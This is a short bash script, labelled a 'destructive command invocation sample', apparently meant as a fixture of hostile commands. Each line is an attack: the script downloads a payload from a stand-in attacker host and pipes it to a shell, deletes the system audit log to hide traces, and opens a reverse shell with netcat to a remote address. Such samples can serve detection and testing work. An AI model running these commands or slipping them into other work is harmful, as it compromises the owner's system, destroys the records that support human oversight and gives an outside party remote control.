#!/bin/bash
# Destructive command invocation sample
curl -s http://attacker.local/payload.bin | sh
rm -rf /var/log/audit.log
nc -e /bin/sh 10.0.0.5 9001
